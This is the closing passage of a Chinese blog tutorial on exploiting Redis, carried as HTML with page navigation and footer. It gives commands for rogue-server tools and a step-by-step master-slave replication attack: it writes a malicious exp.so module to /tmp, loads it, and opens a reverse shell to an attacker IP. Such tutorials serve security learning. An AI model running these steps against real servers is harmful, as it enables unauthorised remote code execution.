+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 未授权情况下</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/n0b0dyCN/redis-rogue-server.git</span><br><span class="line">ls</span><br><span class="line">exp.so  LICENSE  README.md  RedisModulesSDK  redis-rogue-server.py</span><br><span class="line"><span class="built_in">cd</span> RedisModulesSDK/exp</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">python3 redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1</span><br><span class="line"></span><br><span class="line"><span class="comment">## 需要认证情况</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server.git</span><br><span class="line"></span><br><span class="line">python3 redis_rogue_server.py -rhost 127.0.0.1 -lhost 127.0.0.1 -v</span><br></pre></td></tr></table></figure>
+
+<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><blockquote>
+<p>对于只允许本地连接的Redis服务器，可以通过开启主从模式从远程主机上同步恶意.so文件至本地，接着载入恶意.so文件模块，反弹shell至远程主机。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将redis-rogue-server-master的exp.so复制到Awsome-Redis-Rogue-Server的目录下使用，因为exp.so带system模块</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -v 冗余模式，仅启动Rouge Server模式</span></span><br><span class="line">python3 redis_rogue_server.py -v -path exp.so</span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> dir /tmp</span><br><span class="line"><span class="comment"># 一般tmp目录都有写权限，所以选择这个目录写入</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename exp.so</span><br><span class="line"><span class="comment"># 设置导出文件的名字</span></span><br><span class="line">slaveof 192.168.190.128 15000</span><br><span class="line"><span class="comment"># 进行主从同步，将恶意so文件写入到tmp目录</span></span><br><span class="line">module load ./exp.so </span><br><span class="line"><span class="comment"># 加载写入的恶意so文件模块</span></span><br><span class="line">module list</span><br><span class="line"><span class="comment"># 查看恶意so有没有加载成功，主要看有没有“system”</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 反弹shell</span></span><br><span class="line">system.rev 192.168.190.128 1234</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭主从模式</span></span><br><span class="line">slaveof NO ONE</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects_url">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.</span> <span class="toc-text">环境配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">redis简单使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">1.2.</span> <span class="toc-text">未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5shell"><span class="toc-number">1.3.</span> <span class="toc-text">写入shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5ssh"><span class="toc-number">1.4.</span> <span class="toc-text">写入ssh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="toc-number">1.5.</span> <span class="toc-text">远程主从复制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.5.1.</span> <span class="toc-text">原理</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://tefuir72.github.io/2021/10/11/2021101120/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://tefuir72.github.io/2021/10/11/2021101120/&text=浅析Redis漏洞利用"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://tefuir72.github.io/2021/10/11/2021101120/&title=浅析Redis漏洞利用"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://tefuir72.github.io/2021/10/11/2021101120/&is_video=false&description=浅析Redis漏洞利用"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=浅析Redis漏洞利用&body=Check out this article: https://tefuir72.github.io/2021/10/11/2021101120/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://tefuir72.github.io/2021/10/11/2021101120/&title=浅析Redis漏洞利用"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://tefuir72.github.io/2021/10/11/2021101120/&title=浅析Redis漏洞利用"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://tefuir72.github.io/2021/10/11/2021101120/&title=浅析Redis漏洞利用"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://tefuir72.github.io/2021/10/11/2021101120/&title=浅析Redis漏洞利用"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://tefuir72.github.io/2021/10/11/2021101120/&name=浅析Redis漏洞利用&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://tefuir72.github.io/2021/10/11/2021101120/&t=浅析Redis漏洞利用"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    Te Fuir
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects_url">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+ 
+  <link
+    rel="preload"
+    href="/lib/font-awesome/css/all.min.css"
+    as="style"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+  <noscript
+    ><link
+      rel="stylesheet"
+      href="/lib/font-awesome/css/all.min.css"
+  /></noscript>
+
+
+    <!-- jquery -->
+ 
+  
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+
+
+
+<!-- clipboard -->
+
+   
+    
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
